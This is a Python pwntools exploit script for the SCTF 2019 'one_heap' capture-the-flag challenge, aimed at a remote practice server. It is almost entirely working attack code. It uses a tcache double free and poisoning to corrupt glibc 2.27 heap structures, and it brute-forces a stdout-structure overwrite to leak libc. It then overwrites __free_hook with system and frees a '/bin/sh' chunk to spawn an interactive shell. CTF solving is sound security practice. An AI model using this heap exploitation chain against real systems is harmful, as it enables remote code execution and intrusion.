from pwn import *

# context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('sctf_2019_one_heap')
io = remote('node4.buuoj.cn', 26554)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('sctf_2019_one_heap')


def add(size, content):
    io.sendlineafter('Your choice:', '1')
    io.sendlineafter('Input the size:', str(size))
    io.sendlineafter('Input the content:', content)


def delete():
    io.sendlineafter('Your choice:', '2')


def leak():
    global libc_base
    add(0x7f, '0')
    delete()
    delete()
    add(0x7f, '\x10\x20')                   # 1/16
    add(0x7f, '0')
    payload = b'\x00' * 0x23 + b'\x07'
    add(0x7f, payload)
    delete()
    add(0x10, '\xff\x07\x07')
    add(0x20, '0')
    add(0x10, '\x60\x27')                   # 1/16
    payload = p64(0xfbad1800) + p64(0) * 3 + p8(0x58)
    add(0x30, payload)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['_IO_file_jumps']
    log.success('libc_base: ' + hex(libc_base))
    if libc_base & 0xff0000000000 != 0x7f0000000000:
        raise EOFError


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    add(0x10, p64(__free_hook - 8))
    add(0x70, b'/bin/sh\x00' + p64(system))
    delete()
    io.interactive()
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    while True:
        try:
            leak()
        except EOFError:
            io.close()
            # io = process('sctf_2019_one_heap')
            io = remote('node4.buuoj.cn', 26554)
        else:
            break
    pwn()
